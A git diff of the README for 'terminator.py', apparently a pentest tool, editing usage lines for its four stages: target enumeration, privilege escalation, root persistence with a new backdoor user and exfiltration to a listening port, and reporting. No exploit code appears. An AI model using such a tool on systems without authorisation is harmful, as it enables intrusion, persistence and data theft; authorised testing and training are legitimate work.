@@ -25,19 +25,20 @@ first on your own machine, second time on the target machine after gaining initi
 *for help with usage, use the -h flag or grep for 'usage' in the script (grep "usage" terminator.py)*
 
 # syntax
-usage (stage 1-enumerating target from local machine):
+(stage 1-enumerating target from local machine):
 - python3 terminator.py enum -t <target_ip_to_enumerate>
 (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
 
-usage (stage 2-privilege escalation after gaining shell on target machine):
+(stage 2-privilege escalation after gaining shell on target machine):
 - python3 terminator.py priv
 
-usage (stage 3-persistence/data exfiltration after gaining root privileges on target machine):
+(stage 3-persistence/data exfiltration after gaining root privileges on target machine):
 - python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port>
 (optional: -f (bypass root permissions check))
 
-usage (stage 4-create report on local machine):
+(stage 4-create report on local machine):
 - python3 terminator.py report -o <output_file_name>
 
+local machine = your own machine
 
 -+- Leave a comment if you have any questions! -+-
